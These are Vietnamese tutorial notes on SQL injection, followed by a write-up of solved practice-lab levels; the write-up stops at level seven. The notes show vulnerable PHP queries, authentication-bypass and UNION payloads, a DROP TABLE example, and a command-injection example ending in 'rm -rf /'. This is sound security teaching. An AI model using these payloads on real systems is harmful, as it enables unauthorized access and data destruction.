# Intro
- Hầu hết các ứng dụng web hiện đại đều sử dụng cấu trúc cơ sở dữ liệu tại back-end. Cơ sở dữ liệu như vậy được sử dụng để lưu trữ và truy xuất dữ liệu liên quan đến ứng dụng web, từ nội dung web thực tế đến thông tin và nội dung người dùng, v.v. Để làm cho các ứng dụng web trở nên năng động, ứng dụng web phải tương tác với cơ sở dữ liệu theo thời gian thực. Khi các yêu cầu HTTP(S) đến từ người dùng, phần phụ trợ của ứng dụng web sẽ đưa ra các truy vấn tới cơ sở dữ liệu để xây dựng phản hồi. Các truy vấn này có thể bao gồm thông tin từ yêu cầu HTTP(S) hoặc thông tin liên quan khác.

![image](https://github.com/user-attachments/assets/4dadba74-8cd0-4685-bc2b-7316ba52798b)

- Khi thông tin do người dùng cung cấp được sử dụng để xây dựng truy vấn tới cơ sở dữ liệu, người dùng có ý định không tốt có thể lừa truy vấn được sử dụng cho mục đích khác với mục đích của lập trình viên ban đầu, cung cấp cho người dùng quyền truy cập để truy vấn cơ sở dữ liệu bằng cách sử dụng một cuộc tấn công được gọi là **SQL injection** ( SQLi).

- **SQL injection** đề cập đến các cuộc tấn công chống lại cơ sở dữ liệu quan hệ như MySQL (việc injections vào cơ sở dữ liệu không quan hệ, chẳng hạn như MongoDB, là việc NoSQL injections).

## Databases
### Database Management Systems
- **Hệ thống quản lý cơ sở dữ liệu** hay **Database Management Systems** **(DBMS)** giúp tạo, xác định, lưu trữ và quản lý cơ sở dữ liệu. Nhiều loại **DBMS** khác nhau được thiết kế theo thời gian, chẳng hạn như DBMS dựa trên tệp, DBMS quan hệ (RDBMS), NoSQL, dựa trên đồ thị và lưu trữ Khóa/Giá trị.

- Có nhiều cách để tương tác với DBMS, chẳng hạn như các công cụ dòng lệnh, giao diện đồ họa hoặc thậm chí APIs (Application Programming Interfaces). DBMS được sử dụng trong các lĩnh vực ngân hàng, tài chính và giáo dục khác nhau để ghi lại lượng lớn dữ liệu. Một số tính năng cần thiết của DBMS bao gồm:

| Tính năng                  | Mô tả                                                                                                     |
|----------------------------|-----------------------------------------------------------------------------------------------------------|
| **Concurrency** (Tính đồng thời)            | Ứng dụng thực tế thường có nhiều người dùng tương tác cùng lúc. DBMS đảm bảo các tương tác này thành công mà không làm hỏng hoặc mất dữ liệu. |
| **Consistency** (Tính nhất quán)            | Với nhiều tương tác đồng thời, DBMS cần đảm bảo rằng dữ liệu vẫn nhất quán và hợp lệ trong toàn bộ cơ sở dữ liệu. |
| **Security**                   | DBMS cung cấp các cơ chế kiểm soát bảo mật chi tiết thông qua xác thực người dùng và phân quyền, ngăn chặn truy cập trái phép vào dữ liệu nhạy cảm. |
| **Reliability**                | Hệ thống cho phép sao lưu cơ sở dữ liệu dễ dàng và khôi phục lại trạng thái trước đó trong trường hợp mất dữ liệu hoặc bị xâm phạm. |
| **Structured Query Language** | SQL đơn giản hóa việc tương tác với cơ sở dữ liệu nhờ cú pháp trực quan, hỗ trợ nhiều thao tác khác nhau.                             |

![image](https://github.com/user-attachments/assets/ac74fee0-bc79-4ddd-8f64-038bf114e215)

- Trong hệ thống, **Tier I** thường là các ứng dụng phía người dùng như trang web hoặc các chương trình giao diện đồ họa (GUI). Đây là nơi diễn ra các thao tác trực tiếp với người dùng, chẳng hạn như đăng nhập hoặc bình luận. Dữ liệu từ các thao tác này được gửi đến **Tier II** thông qua các API hoặc các yêu cầu khác.

- **Tier II** là tầng trung gian (**middleware**), có nhiệm vụ xử lý các sự kiện nhận được và định dạng chúng sao cho phù hợp với hệ thống quản lý cơ sở dữ liệu (DBMS). Lớp ứng dụng trong tầng này sử dụng các thư viện và trình điều khiển (drivers) phù hợp với loại DBMS để thực hiện việc tương tác.

- Hệ thống quản lý cơ sở dữ liệu (DBMS) nhận các truy vấn từ tầng trung gian, thực hiện các tác vụ được yêu cầu như chèn, truy xuất, xóa hoặc cập nhật dữ liệu. Sau khi xử lý xong, DBMS trả về dữ liệu được yêu cầu hoặc mã lỗi nếu truy vấn không hợp lệ.

- Có thể đặt máy chủ ứng dụng (**application server**) và hệ thống DBMS trên cùng một máy. Tuy nhiên, đối với các cơ sở dữ liệu lớn hoặc có nhiều người dùng truy cập, việc tách chúng ra trên các máy chủ riêng biệt thường được ưu tiên để cải thiện hiệu suất và khả năng mở rộng.

## Types of Databases
### Relational Databases
- Cơ sở dữ liệu quan hệ (**Relational Database**) là một trong những loại cơ sở dữ liệu phổ biến nhất, sử dụng một **schema** (cấu trúc định sẵn) để xác định cách dữ liệu được tổ chức và lưu trữ.
- Với cơ sở dữ liệu này, các dữ liệu được tổ chức thành bảng (tables) giống như bảng trong Excel. Mỗi bảng lưu trữ một loại thông tin, và các bảng này liên kết với nhau thông qua khóa (keys).

### Non-relational Databases
- Cơ sở dữ liệu phi quan hệ (**Non-relational Databases**), hay còn gọi là NoSQL, không sử dụng các bảng, dòng, cột, hay các mối quan hệ chặt chẽ như cơ sở dữ liệu quan hệ. Thay vào đó, NoSQL lưu trữ dữ liệu theo nhiều mô hình linh hoạt, tùy thuộc vào loại dữ liệu. Điều này khiến NoSQL rất linh hoạt và dễ mở rộng, đặc biệt khi làm việc với dữ liệu không có cấu trúc rõ ràng.
- Do các đặc điểm trên nên ta sẽ dùng **NoSQL** khi:
    - Dữ liệu không có cấu trúc hoặc thay đổi thường xuyên (ví dụ: dữ liệu mạng xã hội, logs).
    - Cần mở rộng dễ dàng để hỗ trợ lượng dữ liệu lớn.
    - Không cần sự liên kết chặt chẽ giữa các phần dữ liệu.

- Một số mô hình lưu trữ phổ biến của NoSQL
    - **Key-Value:**

        - Lưu trữ dữ liệu dưới dạng cặp key-value (giống từ điển trong Python).
        -  Ví dụ:
        ```json
        {
          "100001": {
            "date": "01-01-2021",
            "content": "Welcome to this web application."
          },
          "100002": {
            "date": "02-01-2021",
            "content": "This is the first post on this web app."
          }
        }
        ```
        - **Key:** Mã định danh duy nhất (như "100001").
        - **Value:** Nội dung dữ liệu (có thể là chuỗi, từ điển, hoặc đối tượng phức tạp).
    - **Document-Based:**

        - Dữ liệu được lưu dưới dạng tài liệu (document), thường là JSON hoặc XML.
        - Mỗi document chứa tất cả thông tin liên quan trong một đối tượng.
    - **Wide-Column:**

        - Lưu dữ liệu dưới dạng bảng với các cột tùy biến.
        - Thích hợp cho các ứng dụng cần truy vấn nhanh với cấu trúc dữ liệu phức tạp.
    - **Graph:**

        - Lưu trữ dữ liệu dạng đồ thị, với các nút (nodes) và cạnh (edges).
        - Thích hợp cho dữ liệu có mối quan hệ phức tạp, như mạng xã hội hoặc bản đồ.
    
| Đặc điểm                | Cơ sở dữ liệu Quan hệ (Relational)                           | Cơ sở dữ liệu Phi Quan hệ (Non-relational)          |
|-------------------------|-------------------------------------------------------------|-----------------------------------------------------|
| **Cấu trúc dữ liệu**    | Dữ liệu được tổ chức trong bảng (tables) với hàng và cột.   | Dữ liệu không theo cấu trúc bảng, lưu dạng key-value, document, graph, hoặc wide-column. |
| **Schema**              | Có schema cố định, yêu cầu định nghĩa trước khi thêm dữ liệu. | Không yêu cầu schema cố định, linh hoạt hơn trong việc thay đổi cấu trúc dữ liệu. |
| **Quan hệ dữ liệu**      | Có mối quan hệ chặt chẽ giữa các bảng thông qua khóa (keys). | Không có hoặc rất ít quan hệ chặt chẽ giữa các phần dữ liệu. |
| **Ngôn ngữ truy vấn**    | Sử dụng SQL (Structured Query Language).                    | Không cần SQL, thường sử dụng API hoặc JSON/XML để truy vấn. |
| **Khả năng mở rộng**     | Mở rộng theo chiều dọc (nâng cấp máy chủ).                  | Mở rộng theo chiều ngang (thêm máy chủ mới).        |
| **Tốc độ xử lý**         | Thường chậm hơn khi xử lý dữ liệu lớn hoặc phi cấu trúc.    | Xử lý nhanh hơn, đặc biệt với dữ liệu lớn và phi cấu trúc. |
| **Dữ liệu phù hợp**      | Phù hợp với dữ liệu có cấu trúc và quan hệ rõ ràng.         | Thích hợp với dữ liệu phi cấu trúc hoặc thay đổi thường xuyên. |
| **Ứng dụng phổ biến**    | Hệ thống quản lý tài chính, ERP, CRM.                      | Big data, mạng xã hội, phân tích log, dữ liệu IoT.  |
| **Ví dụ**               | MySQL, PostgreSQL, Oracle, SQL Server.                     | MongoDB, Redis, Cassandra, Neo4j.                  |

## MySQL
- Structured Query Language (SQL) hay ngôn ngữ truy vấn có cấu trúc là một ngôn ngữ tiêu chuẩn được sử dụng để giao tiếp và quản lý dữ liệu trong hệ quản trị cơ sở dữ liệu quan hệ (**Relational Database Management System - RDBMS**). Nó cho phép người dùng thực hiện các thao tác trên cơ sở dữ liệu như truy vấn, thêm, sửa, xóa dữ liệu và quản lý cấu trúc cơ sở dữ liệu.
- Tuy nhiên tùy thuộc vào loại **RDBMS** mà **SQL syntax** có thể khác nhau giữa các **RDNMS**. Mặc dù khác nhau nhưng tất cả chúng đều phải tuân theo tiêu chuẩn **ISO** của SQL. Syntax MySQL/MariaDB cho các ví dụ được hiển thị. SQL có thể được sử dụng để thực hiện các hành động sau:
    - **Retrieve data**
    - **Update data**
    - **Delete data**
    - **Create new tables and databases**
    - **Add / remove users**
    - **Assign permissions to these users**
- Cụ thể chi hơn thì học SQL là bt nha:))))


## SQL Injection (SQLi)
- Injection vulnerabilities xảy ra khi dữ liệu đầu vào do người dùng kiểm soát không được xử lý đúng cách và trực tiếp được đưa vào mã nguồn hoặc truy vấn, dẫn đến việc thực thi mã không mong muốn hoặc truy cập dữ liệu trái phép.
- Có rất nhiều loại injection vulnerabilities như là:
    - HTTP injection.
    - Code injection
    - Command injection.
    - SQL injection.

### 1. HTTP Injection
- HTTP Injection xảy ra khi đầu vào không an toàn được nhúng vào tiêu đề hoặc nội dung HTTP. Lỗ hổng này cho phép ta sửa đổi cấu trúc HTTP để thực hiện các hành vi độc hại, như:

    - Biến đổi URL: Chèn thêm tham số vào URL để khai thác hoặc dò tìm thông tin.
    - Sửa đổi tiêu đề HTTP (HTTP Headers): Tấn công có thể chèn các trường không mong muốn trong tiêu đề, như Host, Referer, hoặc User-Agent.
- Ví dụ: Một ứng dụng sử dụng trực tiếp giá trị Host từ tiêu đề để xây dựng URL:

```python
url = f"http://{request.headers['Host']}/login"
```
- Ta có thể chèn mã độc vào tiêu đề Host để chuyển hướng người dùng tới một trang web lừa đảo.

### 2. Code Injection
- Code Injection xảy ra khi dữ liệu đầu vào không được xác thực được đưa trực tiếp vào mã thực thi (như Python, PHP, hoặc JavaScript), dẫn đến thực thi mã không mong muốn.

- Ta có thể thực thi mã trên máy chủ hoặc ứng dụng.

- Ví dụ: Trong PHP, đoạn mã sau dễ bị tấn công:

```php
eval("return " . $_GET['input'] . ";");
```

### 3. Command Injection
- Command Injection xảy ra khi dữ liệu không được kiểm soát được đưa vào các lệnh hệ điều hành (OS commands). Lỗ hổng này cho phép ta thực thi lệnh tùy ý trên hệ thống đích.

- Ta có thể chiếm quyền điều khiển máy chủ hoặc thực hiện các hành động độc hại như xóa dữ liệu, đánh cắp thông tin.

- Ví dụ
```python
os.system(f"ping {user_input}")
```
- Nếu user_input là 127.0.0.1 && rm -rf /, lệnh rm -rf / sẽ được thực thi, gây mất toàn bộ dữ liệu.

### 4. SQL Injection
- SQL Injection (SQLi) xảy ra khi đầu vào không an toàn được đưa trực tiếp vào truy vấn SQL. Điều này cho phép ta:

    - Lấy thông tin nhạy cảm từ cơ sở dữ liệu.
    - Chèn, sửa đổi, hoặc xóa dữ liệu.
    - Thậm chí có thể chiếm quyền điều khiển máy chủ.
- Ví dụ: Truy vấn SQL dễ bị tấn công:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
- Nếu username là admin' --, truy vấn sẽ trở thành:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```
- Để thực hiện SQL Injection (SQLi), ta cần chèn mã SQL độc hại vào đầu vào của người dùng, sau đó phá vỡ logic truy vấn ban đầu của ứng dụng web hoặc thêm một truy vấn hoàn toàn mới. Điều này đòi hỏi việc vượt qua giới hạn đầu vào dự kiến để mã SQL độc hại được thực thi thay vì chỉ xử lý như dữ liệu thông thường.

- Cách thức thực hiện:

    - Đầu tiên ta sẽ thoát khỏi giới hạn đầu vào:

        - Ta thường bắt đầu bằng cách chèn ký tự đặc biệt như dấu ngoặc đơn (') hoặc dấu ngoặc kép (") vào đầu vào để thoát khỏi chuỗi đầu vào ban đầu và đưa mã độc vào truy vấn SQL.
        - Ví dụ: Nếu ứng dụng mong đợi một tên người dùng, việc nhập ' OR '1'='1 có thể thay đổi logic của truy vấn SQL.
    - Thêm mã độc:

        - Sau khi thoát khỏi chuỗi đầu vào, ta có thể thêm một đoạn mã SQL để thực hiện hành vi mong muốn, chẳng hạn như:
        - Chồng truy vấn (stacked queries): Thực hiện nhiều truy vấn trong một lệnh, ví dụ: '; DROP TABLE users; --.
        - Truy vấn Union: Kết hợp kết quả từ truy vấn của ứng dụng với kết quả từ truy vấn do ta đưa vào.
    - Truy xuất kết quả:

        - Để khai thác thành công, ta thường cần thấy đầu ra từ truy vấn, chẳng hạn như dữ liệu hiển thị trên giao diện web.
        - Nếu không có cách hiển thị trực tiếp, họ có thể cố gắng ghi kết quả ra file hoặc sử dụng các cách khác để kiểm tra.
- Ví dụ minh họa:
    - Giả sử một ứng dụng web thực hiện truy vấn SQL để kiểm tra tài khoản người dùng:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
- Ta nhập vào:
```text
username: admin' --
password: (tùy ý).
```
- Truy vấn sẽ trở thành:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```
- Dấu `--` làm mọi thứ sau nó bị bỏ qua, dẫn đến việc truy vấn chỉ kiểm tra tên người dùng admin, và bỏ qua kiểm tra mật khẩu.


## Sử dụng SQL trong Ứng dụng Web

Hầu hết các ứng dụng web đều sử dụng cơ sở dữ liệu như MySQL để lưu trữ và truy xuất dữ liệu. Sau khi cài đặt hệ thống quản lý cơ sở dữ liệu (DBMS) trên máy chủ phụ trợ và đưa vào hoạt động, ứng dụng web có thể dễ dàng sử dụng để xử lý dữ liệu.

Ví dụ, trong một ứng dụng web PHP, chúng ta có thể kết nối đến cơ sở dữ liệu MySQL và thực hiện truy vấn như sau:

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

Kết quả truy vấn có thể được hiển thị như sau:

```php
while($row = $result->fetch_assoc()) {
    echo $row["name"]."<br>";
}
```

Ứng dụng web cũng thường xử lý các dữ liệu đầu vào từ người dùng để tìm kiếm thông tin. Ví dụ, khi người dùng thực hiện tìm kiếm một tên cụ thể, dữ liệu đầu vào của họ được truyền vào truy vấn SQL:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

### SQL Injection là gì?

SQL Injection xảy ra khi dữ liệu đầu vào của người dùng được chèn trực tiếp vào truy vấn SQL mà không qua bất kỳ kiểm tra hoặc xử lý nào. Điều này tạo cơ hội cho kẻ tấn công đưa mã độc hại vào hệ thống.

Ví dụ:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Nếu kẻ tấn công nhập vào: `1'; DROP TABLE users;`, truy vấn SQL sẽ trở thành:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

Điều này có thể dẫn đến việc xóa toàn bộ bảng `users`.

### Các loại SQL Injection

![image](https://github.com/user-attachments/assets/aea168f6-cc77-4e44-abdc-348a190a9e68)

SQL Injection được phân loại dựa trên cách và nơi kết quả được truy xuất:

1. **In-band SQL Injection**: Kết quả truy vấn được hiển thị trực tiếp trên giao diện người dùng.
   - **Union-Based SQLi**: Kết hợp kết quả từ nhiều truy vấn.
   - **Error-Based SQLi**: Dựa vào thông tin lỗi từ SQL để lấy dữ liệu.

2. **Blind SQL Injection**: Kết quả không hiển thị trực tiếp, nhưng có thể được suy ra.
   - **Boolean-Based SQLi**: Sử dụng các điều kiện đúng/sai để kiểm tra.
   - **Time-Based SQLi**: Sử dụng các lệnh gây chậm (như `SLEEP()`) để phát hiện.

3. **Out-of-band SQL Injection**: Gửi kết quả đến một máy chủ từ xa, chẳng hạn như qua DNS.

---

## Subverting Query Logic

Bây giờ khi đã hiểu cơ bản về cách hoạt động của các câu lệnh SQL, chúng ta có thể tìm hiểu về SQL Injection và cách làm sai lệch logic truy vấn. Trước tiên, chúng ta sẽ học cách chèn toán tử **OR** và sử dụng các bình luận SQL để làm thay đổi logic của truy vấn ban đầu. Một ví dụ điển hình là **bỏ qua bước xác thực**, mà chúng ta sẽ minh họa trong phần này.

### Authentication Bypass

- Giả sử tồn tại trang đăng nhập sử dụng truy vấn SQL như sau để kiểm tra thông tin đăng nhập:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

- Trang sẽ so sánh thông tin đầu vào với cơ sở dữ liệu và nếu thông tin khớp, người dùng sẽ được cấp quyền truy cập. Tuy nhiên, nếu nhập thông tin sai, truy vấn sẽ trả về **false**, và quá trình xác thực sẽ bị từ chối.

### SQLi Discovery

- Để kiểm tra xem biểu mẫu đăng nhập có dễ bị tấn công SQL Injection hay không, chúng ta có thể thử chèn một trong các payload sau vào trường đầu vào:

| Payload | URL Encoded |
|---------|-------------|
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

- Nếu một thông báo lỗi SQL xuất hiện thay vì thông báo thất bại thông thường, điều đó cho thấy biểu mẫu có thể bị khai thác. Ví dụ:

```sql
SELECT * FROM logins WHERE username=''' AND password='something';
```

- Kết quả là lỗi cú pháp do số lượng dấu ngoặc đơn không cân bằng.

### OR Injection

- Để bỏ qua bước xác thực, chúng ta cần đảm bảo truy vấn SQL luôn trả về **true**. Điều này có thể thực hiện bằng cách thêm toán tử **OR** cùng với một điều kiện luôn đúng như `'1'='1'`. Khi chèn payload sau:

```sql
admin' OR '1'='1
```

- Câu truy vấn sẽ trở thành:

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
```

### Giải Thích

![image](https://github.com/user-attachments/assets/4f0a2011-58b8-48cb-b1ef-4313f2125ff9)

1. Điều kiện đầu tiên kiểm tra `username='admin'`.
2. Điều kiện `OR '1'='1'` luôn đúng.
3. Kết hợp với **AND**, truy vấn vẫn trả về **true**.

- Với logic này, người tấn công có thể đăng nhập mà không cần biết mật khẩu thực tế. Điều kiện `'1'='1'` đảm bảo truy vấn luôn thành công, bất kể mật khẩu nhập vào.

### Auth Bypass with OR operator

- Nếu không biết tên người dùng hợp lệ, chúng ta có thể sử dụng phương pháp tương tự với trường mật khẩu:

```sql
' OR '1'='1
```

- Câu truy vấn sẽ trở thành:

```sql
SELECT * FROM logins WHERE username='anyUser' AND (password='' OR '1'='1');
```

- Điều này dẫn đến việc truy vấn trả về tất cả các bản ghi trong bảng và cấp quyền đăng nhập cho người đầu tiên trong danh sách.

## Using Comments

- SQL cũng hỗ trợ sử dụng bình luận, tương tự như nhiều ngôn ngữ lập trình khác. Bình luận giúp tài liệu hóa truy vấn hoặc bỏ qua một phần truy vấn không cần thiết. 
- MySQL cho phép sử dụng hai kiểu bình luận dòng là `--` và `#`. Ngoài ra, cũng có thể dùng bình luận nội tuyến `/ * */`, tuy nhiên kiểu này ít được sử dụng trong các cuộc tấn công SQL Injection.

### Comments

- Bình luận kiểu `--` được sử dụng như sau:
```sql
SELECT username FROM logins; -- Chỉ lấy tên đăng nhập từ bảng logins
```
- Kết quả:
```plaintext
+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
```
- Lưu ý: Sau `--` cần có khoảng trống (space) để bắt đầu bình luận. Trong URL, khoảng trống được mã hóa thành `+`, ví dụ: `--+`.

- Bình luận kiểu `#` cũng được hỗ trợ:
```sql
SELECT * FROM logins WHERE username = 'admin'; # Phần này bị bỏ qua
```

- Kết quả:
```plaintext
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
```
- Tip: Khi nhập payload vào URL trong trình duyệt, ký hiệu `#` sẽ bị coi là thẻ và không được truyền trong URL. Để sử dụng `#`, hãy mã hóa thành `%23`.

### Auth Bypass with comments

- Trong ví dụ trước, chúng ta có thể sử dụng payload `admin'--` làm tên người dùng. Truy vấn sẽ trở thành:
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password='something';
```
- Phần `AND password='something'` bị bỏ qua nhờ bình luận, giúp đảm bảo truy vấn không có lỗi cú pháp.

- Thử trên trang đăng nhập với tên người dùng là `admin'--` và mật khẩu bất kỳ:
  - Kết quả: Bỏ qua xác thực thành công, truy vấn chỉ kiểm tra `username='admin'`.

### Some example

- SQL hỗ trợ sử dụng dấu ngoặc đơn để ưu tiên kiểm tra một số điều kiện. 
- Ví dụ:
```sql
SELECT * FROM logins WHERE (id > 1) AND username='admin';
```
- Truy vấn trên đảm bảo chỉ những ID lớn hơn `1` mới được kiểm tra.

- Nếu không cân bằng dấu ngoặc, truy vấn sẽ bị lỗi cú pháp. Để sửa lỗi, thêm dấu ngoặc đóng trong payload:
```sql
admin')--
```
- Kết quả:
```sql
SELECT * FROM logins WHERE (username='admin')
```
- Truy vấn trả về thông tin người dùng `admin`.

## Union Injection

- Khi đã hiểu cách sử dụng câu lệnh Union, chúng ta có thể áp dụng nó trong tấn công SQL Injection. Ví dụ minh họa sau đây:

    ```url
    http://SERVER_IP:PORT/search.php?port_code=cn
    ```

- Chúng ta nhận thấy có khả năng SQL Injection thông qua tham số tìm kiếm. Tiến hành kiểm tra bằng cách chèn một dấu `'`:

    ```url
    http://SERVER_IP:PORT/search.php?port_code=cn'
    ```

- Kết quả xuất hiện lỗi, chứng tỏ trang web dễ bị tấn công SQL Injection. Đây là một trường hợp lý tưởng để sử dụng Union-based Injection.

### Detect number of columns

- Trước khi khai thác, cần xác định số cột trong bảng bằng một trong hai cách:

1. **Using ORDER BY**:

    - Chèn lần lượt `order by 1`, `order by 2`,... cho đến khi gặp lỗi.

    ```sql
    ' order by 1-- -
    ' order by 2-- -
    ```

    - Khi lệnh `order by 5` trả về lỗi, điều đó nghĩa là bảng có 4 cột.

2. **Using UNION**:

    - Chèn thử một câu truy vấn Union với số lượng cột khác nhau.

    ```sql
    cn' UNION select 1,2,3-- 
    ```

    - Nếu lệnh trên lỗi, thử với 4 cột:
    ```sql
    cn' UNION select 1,2,3,4-- 
    ```

    - Khi kết quả trả về thành công, nghĩa là bảng có 4 cột.

### Location of Injection

- Một truy vấn có thể trả về nhiều cột, nhưng không phải tất cả đều được hiển thị. Cần xác định cột nào in kết quả trên trang.

    - Ví dụ: Với truy vấn Union trả về `1, 2, 3, 4`, trang chỉ hiển thị `2, 3, 4`.
    - Để kiểm tra, sử dụng truy vấn sau và thay đổi nội dung cột:

    ```sql
    cn' UNION select 1,@@version,3,4-- -
    ```

    - Nếu cột thứ 2 hiển thị, kết quả sẽ in ra phiên bản cơ sở dữ liệu.


# Chall
## Sandbox
- SQL check từng bảng coi sao.
```bash
show tables;
```
- Ta thấy có 2 tables là `news` và `users` vô coi thử có gì thôi.

```bash
select * from news;
select * from users;
```
![image](https://github.com/user-attachments/assets/efafadf4-53cc-4a06-a857-a3147240b04e)


![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)

![image](https://github.com/user-attachments/assets/ed5863d6-0220-46cd-838c-602d2b6a1596)

## Basic
### LV1:
- LV này thì mình ko đọc source mình sql đại:)))
```bash
admin' or '1'='1
```

![image](https://github.com/user-attachments/assets/d77d3526-f848-488f-8f3e-1a3844410a1f)

### LV2:
- Do có đọc source nên mình được sytax của truy vấn.

```php
{
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row
```

- Do đó mình truy vấn như sau:
```bash 
admin" or "1"="1 -- 
```

![image](https://github.com/user-attachments/assets/006199f0-ec5d-4a01-881f-25e3a42a1b38)

### LV3
```php
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row
```

- by pass bằng cmt thôi.
```bash
admin") -- 
```

![image](https://github.com/user-attachments/assets/be37814c-a5f0-4350-8080-82ca1af57c72)


### LV4
- Chall check valid.
```php
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}

function loginHandler($username, $password)
{
    if (!checkValid($username) || !checkValid($password))
        return "Hack detected";

    try {
        include("db.php");
        $database = make_connection("hashed_db");

        $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

```
- Có nghĩa là ta không được sử dụng `"`.


- Ta phải tìm cách thoát khỏi dấu `"`. Ở đây thì mình tìm được cách dùng `\` để thoát khỏi `"`, nhập:
    - Username: `\`
    - Password: `) UNION SELECT username from users-- `

### LV5
```php
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username, password FROM users WHERE username='$username'";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row
```
- Ở đây ta chỉ cần để ý truy vấn cũng như `$row = $query->fetch_assoc(); // Get the first row` hàm này sẽ chỉ cho phép ta hiện thị được 1 dòng khi select.

- Với `union` thì ta có thể thao tác thay đổi pass hay chèn thêm các user vào.
- Tuy nhiên với bài này thì mình sẽ thay đổi pass của `admin` r dùng pass đó để login.

```sql
abc' UNION SELECT 'admin', MD5('abc') -- 
```
- Pass: `abc`.

![image](https://github.com/user-attachments/assets/330b7cfd-ea4d-4fbc-bd58-fbf6ac306089)

### LV6
```php
<?php
if (isset($_GET["id"])) {
    try {
        include("db.php");
        $database = make_connection("posts_db");

        $id = $database->real_escape_string($_GET["id"]);
        $sql = "SELECT content FROM posts WHERE id=$id";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row
```

-  Đọc sơ thì ta thấy 1 vài hàm như là `real_escape_string(` hàm này loại bỏ các ký tự đặc biệt (như: **NULL , \n, \r, \, “, ", Control-Z**) trong chuỗi `id`.
- Tương tự chall trên thì ta cx lại có `$row = $query->fetch_assoc(); // Get the first row`.
- H ta thử phá thoi:)))
- Nếu nhập id ko có thì not found điều này khá hiển nhiên. Tuy nhiên ta thử chèn sql vào xem nó có hoạt động ko:))

![image](https://github.com/user-attachments/assets/d4f0742b-8d5b-4be6-bb67-a9df84686aa0)
- Quên ko đọc đề nên mình ngồi mò mãi chả bt nó chỉ yêu cầu mình check version:))

![image](https://github.com/user-attachments/assets/78e287ac-6336-40fc-a53e-14afecbc24a8)

### LV7
- Sau khi thử đủ cách mình quyết định đi đọc source:)

```php
<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: profile.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }   
}

include("../basic/static/html/second-order.html");
```